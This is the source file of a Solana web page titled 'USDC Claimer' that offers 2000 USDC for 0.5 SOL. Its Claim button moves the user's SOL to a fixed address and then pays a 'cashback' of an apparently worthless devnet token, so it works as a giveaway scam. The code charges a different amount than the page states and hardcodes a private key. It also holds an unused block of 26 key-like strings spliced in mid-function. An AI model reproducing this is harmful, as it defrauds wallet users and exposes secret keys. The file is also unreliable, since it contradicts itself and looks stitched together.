/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2uF7PYyWPxEcQivR2TFFVwJWURMkiZe6KcZ76hSjjcfNo5t3ukERsVc938X7n2xAX6xareeWWaLwWXwTj6wBGpps"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "57KFn5GncECsvWYvgHjdSJHLqZnmHqGLk1pGQ2T3A6jQfjdt8b8sAEn8pxc5hEcTY675j4F5ezBthYoNcznB2Kti",
  "key1": "59PTopYHFuGB5LUUePDPufL2UgV1r5tsq3JSw66CZAsjdiJgGtA1jpsYqgsEudHPriXSGSuZaaxG6N3y5xG7PsVE",
  "key2": "A5z4CmekwJ7ThaxfkhJ8hM9bEgRCCQoEsV9cRvE72EzAc3G7PL4MWv1cf8JFAgLDNXpACXriJRWZhnHkUdPXuox",
  "key3": "2Tv9L7qfPirRve462rTF2VZZUmPZn11NoAuFJDiWShghpv8Zz1JanWiXfC3wKdQMTHJx4bkTMsMiHw8qmv22sA8q",
  "key4": "4TBcSU1EXK788ewuNNwMXnJg7zkx5JcZcPPfrjrESMwMnan2PLvGyAM6tk2qmTfe8GL6RzmTTZL3QYGtoBTeVL5o",
  "key5": "44HPUEhLMPz3EFkADCnrH1WkekfzYYS2t7wqsRrH95ibrP77hrAh6uySBBZ1h8pvYMVDL7tmBfP2mamMZoh7TRKD",
  "key6": "4Ldf7fGFkNxTKgLk2sexoGFb14ddsiC2vzeMhrXr5vH1c1yG5ztK9ao45Lmk8ixSKemAnfVbq8uV13whPCRUiNu4",
  "key7": "4PW7XpuLYq6Gp9gLkzCc7HtRaLAyTQgL6F9AboWMmGVhSyYMunfeth9xwkynQnQa4A8ogFgTv7CJzJNQ9YKq4PeD",
  "key8": "3NfPdCs9HdFztHRKuTB1V5YrrMJ8cLzHSuZEXMVvtxWSe1ZquRDzzy5hfNmqjVVWdByNubRTcSHfsWnTg613dgNx",
  "key9": "4MudmkhsE8NLEeXBpxx3nUsvqVL4VCP7DtPaLTZMyuccYXFYdPWevW7xdQbhPSYaoYjpjsdAB7Hq19KehWdUBKeC",
  "key10": "HxTzYwMMcnXmxATgQreTXdjsq85fX3ueNDnMu4t6oQEmzGsfauQrSM36qAVP3hhwik5RGRyJpCwxwg35961XfYE",
  "key11": "oLjCo3dZtJNQp1bzybDDGFWTb8JKcUED7XjRNvcLW7NQ8yaQ9Q6nbfBVmJSTTD2LVnsqEnf1ac6bHq2xcmUFoRq",
  "key12": "3yi2LV183P3t2JYhhRDUE3EYEqRs5fLx5uDJoyVrx5L6WNevJK66ZyVq86UxY767T38aWrtxLskTyMXTfJbbzLzm",
  "key13": "3miiqje97nQ2z4omr5gc6vvur2asnNEtJXQho9pFSHKH2HeNALdWE6AnXj4Pz9NLgpFMiCaeFFWkk78dLMDmBRzg",
  "key14": "RLadTAo2ck5LjqpLWKx5aRBCAkSggb3X1ejC6D5kMASp9W8cHqjDZ9auojZRspZejYaRfxs8SDMZJ5EGoj4VMwS",
  "key15": "4NEuc5XCAo7U4WfpYS9iezqYPxbhnMfSwBzhiusbx1qPvNTbt7vpqzxC3cqheUjSyVExstQbh7qoqbNJajRSsRf8",
  "key16": "5nVffBVvZpryAn7ZTks3XqVQUmei7jLQktZRYj2bmshnqoHuoR6pHQmmLEQLUtKqMF78tr4PYtwN7rNT3e4oJcXA",
  "key17": "2GBQ5oiANMAxTpEbB9PsbJnDUMq1nibSBv9krqiWJETiPvZC5uX4roWe9rS9dbwgFX885U2qJUzeqhtnauNNKE86",
  "key18": "AuBWkHXsd4fDahqqGZUbbHpcdWuCJ1qj5S1ccGQKbRRKqoyToxkigfKziUCRRZRLWPc4gDvoeG8Li8ogj9Nmvzo",
  "key19": "4MUYoi4w7MxqXpT24yE75Y5NHfjgQTwX5epXBBmVKmTwFxCLynRjXTmuom1PT6Q3uNdDjCFX7KAf2vmo4yXHG6EC",
  "key20": "3b4JFUD2tp3voQnHdbajD3ewPZwWfZB1otJR7cNkxWtfc7f6Ln8uvVWwyJgkMr4A4AVm7KW53ibqRbUe21FbNus8",
  "key21": "2iKpLBbgJrYxeqjUfhb2JRERpMFHRrGMdAeAFYUstgbvPrPwYto1yCCdSigEbN3ZAgKNSWJxT1ygZuAmsVRbYevL",
  "key22": "5ByER3LGwD3iH5AMZmNFvL2tB36edtxBjCxWf4hBENT8c2vHsbgYQRqbQbmXBy3aCASfnVeZmtHJCr5XNCteDL9Q",
  "key23": "21kMWqX7aTieGVWZubRG8HxRqZcrRtu2epmHWrA9rgUQ89hrboSZaUnsMY71aiP1TjhRxstUMQWmeqre6AmHYdDE",
  "key24": "VDQgsXmdeKBc437UWL3VfN9ciaadQ9F1zysoPkBVJvJtSWJq4uu6xi11jCeR7TACCjqHbB39UBfE145tqpzTLsH",
  "key25": "3KDEzF2JDcw7bEDe2zqtZpJ4TWMF5poQMh8f3oz8BepzFqvjGhLAwVTviAgh19mk5xjUeiPZQUQkS2BpeatLGV3z"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
